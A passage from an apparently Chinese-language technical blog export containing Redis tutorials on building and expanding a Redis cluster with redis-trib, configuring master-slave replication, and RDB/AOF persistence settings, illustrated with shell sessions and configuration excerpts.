<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@server.tianshuai.com]$ redis-trib create --replicas 1 192.168.0.201:7001 192.168.0.201:7002 192.168.0.201:7003 192.168.0.201:7004 192.168.0.201:7005 192.168.0.201:7006</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; Creating cluster</span></span><br><span class="line">Connecting to node 192.168.0.201:7001: OK</span><br><span class="line">Connecting to node 192.168.0.201:7002: OK</span><br><span class="line">Connecting to node 192.168.0.201:7003: OK</span><br><span class="line">Connecting to node 192.168.0.201:7004: OK</span><br><span class="line">Connecting to node 192.168.0.201:7005: OK</span><br><span class="line">Connecting to node 192.168.0.201:7006: OK</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; Performing <span class="built_in">hash</span> slots allocation on 6 nodes...</span></span><br><span class="line">Using 3 masters:</span><br><span class="line">192.168.0.201:7001</span><br><span class="line">192.168.0.201:7002</span><br><span class="line">192.168.0.201:7003                                                                         </span><br><span class="line">Adding replica 192.168.0.201:7004 to 192.168.0.201:7001</span><br><span class="line">Adding replica 192.168.0.201:7005 to 192.168.0.201:7002</span><br><span class="line">Adding replica 192.168.0.201:7006 to 192.168.0.201:7003</span><br><span class="line">M: 699f318027f87f3c49d48e44116820e673bd306a 192.168.0.201:7001                          </span><br><span class="line">   slots:0-5460 (5461 slots) master</span><br><span class="line">M: 96892fd3f51292e922383ddb6e8018e2f772deed 192.168.0.201:7002</span><br><span class="line">   slots:5461-10922 (5462 slots) master</span><br><span class="line">M: f702fd03c1e3643db7e385915842533ba5aab98d 192.168.0.201:7003</span><br><span class="line">   slots:10923-16383 (5461 slots) master</span><br><span class="line">S: d0994ce7ef68c0834030334afcd60013773f2e77 192.168.0.201:7004                          </span><br><span class="line">   replicates 699f318027f87f3c49d48e44116820e673bd306a</span><br><span class="line">S: d880581504caff4a002242b2b259d5242b8569fc 192.168.0.201:7005</span><br><span class="line">   replicates 96892fd3f51292e922383ddb6e8018e2f772deed</span><br><span class="line">S: a77b16c4f140c0f5c17c907ce7ee5e42ee2a7b02 192.168.0.201:7006</span><br><span class="line">   replicates f702fd03c1e3643db7e385915842533ba5aab98d</span><br><span class="line">Can I set the above configuration? (type 'yes' to accept):  YES</span><br><span class="line"> </span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; Nodes configuration updated</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; Assign a different config epoch to each node</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; Sending CLUSTER MEET messages to join the cluster</span></span><br><span class="line">Waiting for the cluster to join...</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; Performing Cluster Check (using node 192.168.0.201:7001)</span></span><br><span class="line">M: 699f318027f87f3c49d48e44116820e673bd306a 192.168.0.201:7001</span><br><span class="line">   slots:0-5460 (5461 slots) master</span><br><span class="line">M: 96892fd3f51292e922383ddb6e8018e2f772deed 192.168.0.201:7002</span><br><span class="line">   slots:5461-10922 (5462 slots) master</span><br><span class="line">M: f702fd03c1e3643db7e385915842533ba5aab98d 192.168.0.201:7003</span><br><span class="line">   slots:10923-16383 (5461 slots) master</span><br><span class="line">M: d0994ce7ef68c0834030334afcd60013773f2e77 192.168.0.201:7004</span><br><span class="line">   slots: (0 slots) master</span><br><span class="line">   replicates 699f318027f87f3c49d48e44116820e673bd306a</span><br><span class="line">M: d880581504caff4a002242b2b259d5242b8569fc 192.168.0.201:7005</span><br><span class="line">   slots: (0 slots) master</span><br><span class="line">   replicates 96892fd3f51292e922383ddb6e8018e2f772deed</span><br><span class="line">M: a77b16c4f140c0f5c17c907ce7ee5e42ee2a7b02 192.168.0.201:7006</span><br><span class="line">   slots: (0 slots) master</span><br><span class="line">   replicates f702fd03c1e3643db7e385915842533ba5aab98d</span><br><span class="line">[OK] All nodes agree about slots configuration.</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; Check <span class="keyword">for</span> open slots...</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; Check slots coverage...</span></span><br><span class="line">[OK] All 16384 slots covered.</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">create --replicas 1    这里--replicas 1 是指定复制几份，相当于每个master有几个从</span></span><br><span class="line"><span class="meta">#</span><span class="bash">redis cluaster最低要求有3个master</span></span><br><span class="line"><span class="meta">#</span><span class="bash">master的定义  host1:port host2:port  host3:port如果--replicas 1 那么：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">host1:port == master  host2:port 是：host1:port从</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">如果--replicas 2 那么：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">host1:port == master host2:port &amp; host3:port 是host1:port 的从</span></span><br><span class="line"> </span><br><span class="line">M: 这个是cluaster 自动生成的ID 集群在通信的时候是使用这个ID来区分的</span><br></pre></td></tr></table></figure>

<p> 4、连接cluster（连接任意的Cluster集群中的服务器即可）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -c -h 192.168.0.201 -p 7001   的需要加-c的参数   可以连接集群的任意节点！</span><br><span class="line"> </span><br><span class="line">192.168.0.201:7001&gt; cluster nodes  查看cluster节点</span><br><span class="line">f702fd03c1e3643db7e385915842533ba5aab98d 192.168.0.201:7003 master - 0 1444813870405 3 connected 10923-16383</span><br><span class="line">699f318027f87f3c49d48e44116820e673bd306a 192.168.0.201:7001 myself,master - 0 0 1 connected 0-5460</span><br><span class="line">d0994ce7ef68c0834030334afcd60013773f2e77 192.168.0.201:7004 slave 699f318027f87f3c49d48e44116820e673bd306a 0 1444813870105 4 connected</span><br><span class="line">a77b16c4f140c0f5c17c907ce7ee5e42ee2a7b02 192.168.0.201:7006 slave f702fd03c1e3643db7e385915842533ba5aab98d 0 1444813868605 6 connected</span><br><span class="line">96892fd3f51292e922383ddb6e8018e2f772deed 192.168.0.201:7002 master - 0 1444813869405 2 connected 5461-10922</span><br><span class="line">d880581504caff4a002242b2b259d5242b8569fc 192.168.0.201:7005 slave 96892fd3f51292e922383ddb6e8018e2f772deed 0 1444813869105 5 connected</span><br><span class="line"> </span><br><span class="line">192.168.0.201:7001&gt; cluster info  查看cluster信息</span><br><span class="line">cluster_state:ok</span><br><span class="line">cluster_slots_assigned:16384</span><br><span class="line">cluster_slots_ok:16384</span><br><span class="line">cluster_slots_pfail:0</span><br><span class="line">cluster_slots_fail:0</span><br><span class="line">cluster_known_nodes:6</span><br><span class="line">cluster_size:3</span><br><span class="line">cluster_current_epoch:6</span><br><span class="line">cluster_my_epoch:1</span><br><span class="line">cluster_stats_messages_sent:1809</span><br><span class="line">cluster_stats_messages_received:1809</span><br></pre></td></tr></table></figure>

<p>5、集群扩容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-trib add-node 192.168.0.201:7007 192.168.0.201:7001 </span><br><span class="line">命令解释：</span><br><span class="line">redis-trib add-node 要加的节点和端口  现有任意节点和端口</span><br><span class="line"> </span><br><span class="line">加完之后查看结果：</span><br><span class="line">192.168.0.201:7001&gt; cluster info</span><br><span class="line">cluster_state:ok</span><br><span class="line">cluster_slots_assigned:16384</span><br><span class="line">cluster_slots_ok:16384</span><br><span class="line">cluster_slots_pfail:0</span><br><span class="line">cluster_slots_fail:0</span><br><span class="line">cluster_known_nodes:7</span><br><span class="line">cluster_size:3</span><br><span class="line">cluster_current_epoch:6</span><br><span class="line">cluster_my_epoch:1</span><br><span class="line">cluster_stats_messages_sent:2503</span><br><span class="line">cluster_stats_messages_received:2503</span><br><span class="line">192.168.0.201:7001&gt; cluster nodes</span><br><span class="line">f702fd03c1e3643db7e385915842533ba5aab98d 192.168.0.201:7003 master - 0 1444814061587 3 connected 10923-16383</span><br><span class="line">699f318027f87f3c49d48e44116820e673bd306a 192.168.0.201:7001 myself,master - 0 0 1 connected 0-5460</span><br><span class="line">d0994ce7ef68c0834030334afcd60013773f2e77 192.168.0.201:7004 slave 699f318027f87f3c49d48e44116820e673bd306a 0 1444814062087 4 connected</span><br><span class="line">a77b16c4f140c0f5c17c907ce7ee5e42ee2a7b02 192.168.0.201:7006 slave f702fd03c1e3643db7e385915842533ba5aab98d 0 1444814061087 6 connected</span><br><span class="line">a1301a9e1fd24099cd8dc49c47f2263e3124e4d6 192.168.0.201:7007 master - 0 1444814063089 0 connected</span><br><span class="line">96892fd3f51292e922383ddb6e8018e2f772deed 192.168.0.201:7002 master - 0 1444814062589 2 connected 5461-10922</span><br><span class="line">d880581504caff4a002242b2b259d5242b8569fc 192.168.0.201:7005 slave 96892fd3f51292e922383ddb6e8018e2f772deed 0 1444814061587 5 connected</span><br><span class="line">192.168.0.201:7001&gt;</span><br></pre></td></tr></table></figure>

<p> 6、新加上来没有数据-及没有槽位，我们可以用命令让他重新分片（分片）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-trib reshard 192.168.0.201:7007</span><br></pre></td></tr></table></figure>

<p> 7、在添加一个服务器做从</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">在添加一个7008 让他做7008的从</span><br><span class="line">[root@server.tianshuai.com]$ redis-trib add-node 192.168.0.201:7008 192.168.0.201:7001</span><br><span class="line">加进来之后默认就是mater但是他没有任何的槽位</span><br><span class="line">192.168.0.201:7001&gt; cluster nodes</span><br><span class="line">f702fd03c1e3643db7e385915842533ba5aab98d 192.168.0.201:7003 master - 0 1444814915795 3 connected 11089-16383</span><br><span class="line">699f318027f87f3c49d48e44116820e673bd306a 192.168.0.201:7001 myself,master - 0 0 1 connected 166-5460</span><br><span class="line">d0994ce7ef68c0834030334afcd60013773f2e77 192.168.0.201:7004 slave 699f318027f87f3c49d48e44116820e673bd306a 0 1444814917298 4 connected</span><br><span class="line">a77b16c4f140c0f5c17c907ce7ee5e42ee2a7b02 192.168.0.201:7006 slave f702fd03c1e3643db7e385915842533ba5aab98d 0 1444814916297 6 connected</span><br><span class="line">a02a66e0286ee2f0a9b5380f7584b9b20dc032ff 192.168.0.201:7008 master - 0 1444814915796 0 connected</span><br><span class="line">a1301a9e1fd24099cd8dc49c47f2263e3124e4d6 192.168.0.201:7007 master - 0 1444814915295 7 connected 0-165 5461-5627 10923-11088</span><br><span class="line">96892fd3f51292e922383ddb6e8018e2f772deed 192.168.0.201:7002 master - 0 1444814916898 2 connected 5628-10922</span><br><span class="line">d880581504caff4a002242b2b259d5242b8569fc 192.168.0.201:7005 slave 96892fd3f51292e922383ddb6e8018e2f772deed 0 1444814916798 5 connected</span><br><span class="line"> </span><br><span class="line">然后连接到7008的这个redis实例上，然后复制7007的ID</span><br><span class="line">192.168.0.201:7008&gt; cluster replicate a1301a9e1fd24099cd8dc49c47f2263e3124e4d6</span><br><span class="line">OK</span><br><span class="line">然后看下：</span><br><span class="line">192.168.0.201:7008&gt; cluster nodes</span><br><span class="line">699f318027f87f3c49d48e44116820e673bd306a 192.168.0.201:7001 master - 0 1444815074072 1 connected 166-5460</span><br><span class="line">a1301a9e1fd24099cd8dc49c47f2263e3124e4d6 192.168.0.201:7007 master - 0 1444815073071 7 connected 0-165 5461-5627 10923-11088</span><br><span class="line">96892fd3f51292e922383ddb6e8018e2f772deed 192.168.0.201:7002 master - 0 1444815073671 2 connected 5628-10922</span><br><span class="line">a77b16c4f140c0f5c17c907ce7ee5e42ee2a7b02 192.168.0.201:7006 slave f702fd03c1e3643db7e385915842533ba5aab98d 0 1444815073571 3 connected</span><br><span class="line">f702fd03c1e3643db7e385915842533ba5aab98d 192.168.0.201:7003 master - 0 1444815072571 3 connected 11089-16383</span><br><span class="line">d0994ce7ef68c0834030334afcd60013773f2e77 192.168.0.201:7004 slave 699f318027f87f3c49d48e44116820e673bd306a 0 1444815073071 1 connected</span><br><span class="line">d880581504caff4a002242b2b259d5242b8569fc 192.168.0.201:7005 slave 96892fd3f51292e922383ddb6e8018e2f772deed 0 1444815073871 2 connected</span><br><span class="line">a02a66e0286ee2f0a9b5380f7584b9b20dc032ff 192.168.0.201:7008 myself,slave a1301a9e1fd24099cd8dc49c47f2263e3124e4d6 0 0 0 connected</span><br><span class="line">192.168.0.201:7008&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.7.107:7002&gt; set key101 shuaige</span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> Redirected to slot [1601] located at 192.168.7.107:7001</span></span><br><span class="line">OK</span><br><span class="line">192.168.7.107:7001&gt; set key102 shuaige</span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> Redirected to slot [13858] located at 192.168.7.107:7003</span></span><br><span class="line">OK</span><br><span class="line">192.168.7.107:7003&gt; set key103 shuaige</span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> Redirected to slot [9731] located at 192.168.7.107:7002</span></span><br><span class="line">OK</span><br><span class="line">192.168.7.107:7002&gt; set key104 shuaige</span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> Redirected to slot [5860] located at 192.168.7.107:7007</span></span><br><span class="line">OK</span><br><span class="line">192.168.7.107:7007&gt; set key105 shuaige</span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> Redirected to slot [1733] located at 192.168.7.107:7001</span></span><br><span class="line">OK</span><br><span class="line">192.168.7.107:7001&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
        <category>NoSQL</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-cluster集群[三]:redis主从复制</title>
    <url>/articles/1e52f2e4.html</url>
    <content><![CDATA[<h2 id="Redis主从复制原理："><a href="#Redis主从复制原理：" class="headerlink" title="Redis主从复制原理："></a>Redis主从复制原理：</h2><p>通过把这个RDB文件或AOF文件传给slave服务器，slave服务器重新加载RDB文件，来实现复制的功能！</p>
<p>复制的话：主服务器可以有多个从服务器！！！  不仅这样从服务器还可以有从服务器，可以做成星状的结构！</p>
<p>复制的话也不会阻塞进程，同样fork一个子进程来做！</p>
<p>复制的原理：</p>
<p>当建立一个从服务器后，从服务器会想主服务器发送一个SYNC的命令，主服务器接收到SYNC命令之后会执行BGSAVE</p>
<p>然后保存到RDB文件，然后发送到从服务器！收到RDB文件然后就载入到内存！</p>
<p>最早不支持增量，到2.8之后就支持增量了！</p>
<a id="more"></a>

<h2 id="Redis主从配置："><a href="#Redis主从配置：" class="headerlink" title="Redis主从配置："></a>Redis主从配置：</h2><p>配置非常简单：</p>
<p>我要把：192.168.0.201  6380 作为192.168.0.201 6379的从就一条命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.0.201:6380&gt; slaveof 192.168.0.201 6379</span><br><span class="line">OK</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">然后使用INFO查看下：</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Replication</span></span><br><span class="line">role:slave</span><br><span class="line">master_host:192.168.0.201</span><br><span class="line">master_port:6379</span><br><span class="line">master_link_status:up</span><br><span class="line">master_last_io_seconds_ago:7</span><br><span class="line">master_sync_in_progress:0</span><br><span class="line">slave_repl_offset:85</span><br><span class="line">slave_priority:100</span><br><span class="line">slave_read_only:1</span><br><span class="line">connected_slaves:0</span><br><span class="line">master_repl_offset:0</span><br><span class="line">repl_backlog_active:0</span><br><span class="line">repl_backlog_size:1048576</span><br><span class="line">repl_backlog_first_byte_offset:0</span><br><span class="line">repl_backlog_histlen:0</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">然后在到主的上面看下：</span></span><br><span class="line">15:38 [root@server.tianshuai.com]$ redis-cli -h 192.168.0.201 -p 6379</span><br><span class="line">192.168.0.201:6379&gt; INFO</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">Replication</span></span><br><span class="line">role:master</span><br><span class="line">connected_slaves:1</span><br><span class="line">slave0:ip=192.168.0.201,port=6380,state=online,offset=183,lag=1    #</span><br><span class="line">master_repl_offset:183</span><br><span class="line">repl_backlog_active:1</span><br><span class="line">repl_backlog_size:1048576</span><br><span class="line">repl_backlog_first_byte_offset:2</span><br><span class="line">repl_backlog_histlen:182</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">从2.61 的时候！从是仅读的</span></span><br><span class="line">192.168.0.201:6380&gt; SET key1 2</span><br><span class="line">(error) READONLY You can't write against a read only slave.</span><br><span class="line">192.168.0.201:6380&gt;&lt;br&gt;##现实工作场景中，写和读是1：10的吗，我们就可以，设置多1个主多个从这样，进行读写分离！</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
        <category>NoSQL</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-cluster集群[二]:redis持久化</title>
    <url>/articles/8d5e3656.html</url>
    <content><![CDATA[<h2 id="Redis持久化原理："><a href="#Redis持久化原理：" class="headerlink" title="Redis持久化原理："></a>Redis持久化原理：</h2><p>Redis支持两种持久化：<strong>RDB</strong>和<strong>AOF</strong>模式</p>
<a id="more"></a>

<h4 id="名词解释："><a href="#名词解释：" class="headerlink" title="名词解释："></a><strong>名词解释：</strong></h4><p><strong>RDB</strong>：持久化可以在指定的时间间隔内生成数据集的时间点快照（point-in-time snapshot）。<br><strong>AOF</strong>：持久化记录服务器执行的所有写操作命令，并在服务器启动时，通过重新执行这些命令来还原数据集。</p>
<p><strong>AOF</strong> 文件中的命令全部以 Redis 协议的格式来保存，新命令会被追加到文件的末尾。 Redis 还可以在后台对 AOF 文件进行重写（rewrite）</p>
<p>使得 AOF 文件的体积不会超出保存数据集状态所需的实际大小。</p>
<p>PDB和AOF的优先级：</p>
<p>如果同时开启RDB和AOF模式，AOF的优先级要比RDB高：<br>Redis 还可以同时使用 AOF 持久化和 RDB 持久化。 在这种情况下， 当 Redis 重启时， 它会优先使用 AOF 文件来还原数据集。</p>
<p>因为 AOF 文件保存的数据集通常比 RDB 文件所保存的数据集更完整。</p>
<p>AOF 的方式有点像ORCAL的逻辑备库！<br>AOF redis 还会在后台对数据进行重写，比如set key1 ， set key1 ,其实第一次的set key1 没用，这样就可以把第一次set key1 删掉了。这样保存下来的数据集就很小了可以压缩了！<br>你甚至可以关闭持久化功能，让数据只在服务器运行时存在。</p>
<h4 id="RDB-amp-AOF优缺点"><a href="#RDB-amp-AOF优缺点" class="headerlink" title="RDB&amp;AOF优缺点"></a><strong>RDB&amp;AOF优缺点</strong></h4><p><strong>RDB</strong>的优缺点：<br>优点：<br>1、紧凑易于备份，他就一个文件。<br>2、RDB可以最大化redis性能、父进程无需做任何操作只需要for一个子进程即可<br>3、恢复比AOF块</p>
<p>缺点：<br>1、数据完整性：如果非常注重数据的完整性，那么RDB就不行，虽然他是一个point-in-time 的快照方式，但是在快照的过程中，redis重启了，那么在快照中的这些数据将会丢失<br>2、数据非常庞大后，非常耗CPU和时间，那么redis讲可能down掉1秒钟设置更长。</p>
<p><strong>AOF</strong>的优缺点：<br>优点：<br>1、 使用 AOF 持久化会让 Redis 变得非常耐久，AOF默认的每一秒追加一次也可以修改他的方式没执行一次命令追加一次，所以你最多丢失1秒钟的数据<br>2、 AOF 文件是一个只进行追加操作的日志文件（append only log）<br>3、 Redis 可以在 AOF 文件体积变得过大时，自动地在后台对 AOF 进行重写</p>
<p>缺点：<br>1、对于相同的数据集来说，AOF 文件的体积通常要大于 RDB 文件的体积。<br>2、 根据所使用的 fsync 策略，AOF 的速度可能会慢于 RDB</p>
<h4 id="RDB-amp-AOF-持久化原理"><a href="#RDB-amp-AOF-持久化原理" class="headerlink" title="RDB &amp; AOF 持久化原理"></a><strong>RDB &amp; AOF 持久化原理</strong></h4><p>快照的运行方式：</p>
<p>当 Redis 需要保存 dump.rdb 文件时， 服务器执行以下操作：</p>
<ol>
<li>Redis 调用 fork() ，同时拥有父进程和子进程。</li>
<li>子进程将数据集写入到一个临时 RDB 文件中。</li>
<li>当子进程完成对新 RDB 文件的写入时，Redis 用新 RDB 文件替换原来的 RDB 文件，并删除旧的 RDB 文件。</li>
<li>这种工作方式使得 Redis 可以从写时复制（copy-on-write）机制中获益。</li>
</ol>
<p>AOF 重写和 RDB 创建快照一样，都巧妙地利用了写时复制机制。</p>
<p>以下是 AOF 重写的执行步骤：</p>
<ol>
<li>Redis 执行 fork() ，现在同时拥有父进程和子进程。</li>
<li>子进程开始将新 AOF 文件的内容写入到临时文件。</li>
<li>对于所有新执行的写入命令，父进程一边将它们累积到一个内存缓存中，一边将这些改动追加到现有 AOF 文件的末尾： 这样即使在重写的中途发生停机，现有的 AOF 文件也还是安全的。</li>
<li>当子进程完成重写工作时，它给父进程发送一个信号，父进程在接收到信号之后，将内存缓存中的所有数据追加到新 AOF 文件的末尾。</li>
<li>搞定！现在 Redis 原子地用新文件替换旧文件，之后所有命令都会直接追加到新 AOF 文件的末尾。</li>
</ol>
<p>AOF重写</p>
<p>因为 AOF 的运作方式是不断地将命令追加到文件的末尾， 所以随着写入命令的不断增加， AOF 文件的体积也会变得越来越大。<br>举个例子， 如果你对一个计数器调用了 100 次 INCR ， 那么仅仅是为了保存这个计数器的当前值， AOF 文件就需要使用 100 条记录（entry）。<br>然而在实际上， 只使用一条 SET 命令已经足以保存计数器的当前值了， 其余 99 条记录实际上都是多余的。<br>为了处理这种情况， Redis 支持一种有趣的特性： 可以在不打断服务客户端的情况下， 对 AOF 文件进行重建（rebuild）。<br>执行 BGREWRITEAOF 命令， Redis 将生成一个新的 AOF 文件， 这个文件包含重建当前数据集所需的最少命令。<br>Redis 2.2 需要自己手动执行 BGREWRITEAOF 命令； Redis 2.4 则可以自动触发 AOF 重写， 具体信息请查看 2.4 的示例配置文件。</p>
<h2 id="Rdis持久化设置："><a href="#Rdis持久化设置：" class="headerlink" title="Rdis持久化设置："></a>Rdis持久化设置：</h2><h4 id="查看下面配置文件："><a href="#查看下面配置文件：" class="headerlink" title="查看下面配置文件："></a>查看下面配置文件：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">默认Redis是开启的RDB模式的持久化</span></span><br><span class="line">vim /etc/redis/6379.conf</span><br><span class="line">=============================================================</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">############################### SNAPSHOTTING  ################################</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Save the DB on disk:</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">   save &lt;seconds&gt; &lt;changes&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">   Will save the DB <span class="keyword">if</span> both the given number of seconds and the given</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   number of write operations against the DB occurred.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">   In the example below the behaviour will be to save:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   after 900 sec (15 min) <span class="keyword">if</span> at least 1 key changed</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   after 300 sec (5 min) <span class="keyword">if</span> at least 10 keys changed</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   after 60 sec <span class="keyword">if</span> at least 10000 keys changed</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">   Note: you can <span class="built_in">disable</span> saving completely by commenting out all <span class="string">"save"</span> lines.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">   It is also possible to remove all the previously configured save</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   points by adding a save directive with a single empty string argument</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   like <span class="keyword">in</span> the following example:</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">   save <span class="string">""</span></span></span><br><span class="line"> </span><br><span class="line">save 900 1</span><br><span class="line">save 300 10</span><br><span class="line">save 60 10000</span><br><span class="line"> </span><br><span class="line">================================================================</span><br><span class="line"><span class="meta">#</span><span class="bash">上面3个save 是或的关系</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">   save &lt;seconds&gt; &lt;changes&gt;   <span class="comment">###格式！</span></span></span><br><span class="line">解释：</span><br><span class="line"><span class="meta">#</span><span class="bash">   after 900 sec (15 min) <span class="keyword">if</span> at least 1 key changed</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   after 300 sec (5 min) <span class="keyword">if</span> at least 10 keys changed</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   after 60 sec <span class="keyword">if</span> at least 10000 keys changed</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">900 sec内有1个key发生了改变就做一次快照 </span></span><br><span class="line"><span class="meta">#</span><span class="bash">或  300sec 内有10个keys发生了改变做一次快照   </span></span><br><span class="line"><span class="meta">#</span><span class="bash">或60 sec内 10000 keys发生了改变做一次快照</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">快照原理：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">forker出一个进程，是当前进程的一个副本相当于子进程，不会影响你当前运行的进程。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">当子进程写的时候会有一个临时的文件，当子进程写完之后会把这个</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">临时的文件move替换老的文件，所以这个rdb的文件任何时间都是一个完整的可用的副本！</span></span><br><span class="line"><span class="meta">#</span><span class="bash">你写的时候不会影响RDB这个文件，因为forker出的子进程正在写的是一个临时文件！</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">但是如果如果故障了，你这个保存的时间是你开始快照那一刻那个时间，你快照到快照完毕那一段时间的数据就丢失了！</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">如果想禁用持久化把这三行删了就行了</span></span><br><span class="line">save 900 1</span><br><span class="line">save 300 10</span><br><span class="line">save 60 10000</span><br></pre></td></tr></table></figure>

<h4 id="快照保存在那里呢？"><a href="#快照保存在那里呢？" class="headerlink" title="快照保存在那里呢？"></a>快照保存在那里呢？</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> The filename <span class="built_in">where</span> to dump the DB</span></span><br><span class="line">dbfilename dump.rdb   #如果你启用了多个快照名称，可以使用端口好来定义比如：dump_6379.rdb</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> Note that you must specify a directory here, not a file name.</span></span><br><span class="line">dir ./  #不仅仅是RDB模式下的DB存放在这个目录AOF模式下也是存放在这个目录的，建议存放在你指定的地方！</span><br><span class="line"> </span><br><span class="line">比如：</span><br><span class="line">dir /opt/redis/</span><br><span class="line"> </span><br><span class="line">比如我上面指定了：</span><br><span class="line"><span class="meta">#</span><span class="bash"> The filename <span class="built_in">where</span> to dump the DB</span></span><br><span class="line">dbfilename dump_6379.rdb</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> Note that you must specify a directory here, not a file name.</span></span><br><span class="line">dir /opt/redis/</span><br></pre></td></tr></table></figure>

<h4 id="手动在Redis中保存"><a href="#手动在Redis中保存" class="headerlink" title="手动在Redis中保存"></a>手动在Redis中保存</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; SET key 1</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; SAVE</span><br><span class="line">OK</span><br><span class="line"> </span><br><span class="line">下目录下面有没有修改：</span><br><span class="line">-rw-r--r-- 1 root root 27 Oct 14 13:35 dump_6379.rdb 当前时间创建</span><br><span class="line">在设置个key看下：</span><br><span class="line">127.0.0.1:6379&gt; SET key 2</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; SAVE</span><br><span class="line">OK</span><br><span class="line"> </span><br><span class="line">-rw-r--r-- 1 root root 27 Oct 14 13:37 dump_6379.rdb</span><br><span class="line"> </span><br><span class="line">127.0.0.1:6379&gt; BGSAVE</span><br><span class="line">Background saving started</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">SAVE和BGSAVE有什么区别：SAVE 是阻塞的当你直接执行SAVE的时候他就不干活了，BGSAVE是在后台执行。forker一个子进程来进行SAVE！</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">SAVE的使用场景仅限于：当Redis需要迁移的时候，Redis没有数据写入并且可以停的时候使用！</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">测试添加一个：key然后停掉看看！不保存：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">目前的key是：</span></span><br><span class="line">127.0.0.1:6379&gt; KEYS *</span><br><span class="line">1) "key"</span><br><span class="line">2) "key2"</span><br><span class="line">3) "key3"</span><br><span class="line"> </span><br><span class="line">127.0.0.1:6379&gt; SET key4 4</span><br><span class="line">OK</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">杀掉，重启之后发现设置的key丢失了。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">所以当redis异常挂掉之后，没有SAVE收据！</span></span><br></pre></td></tr></table></figure>

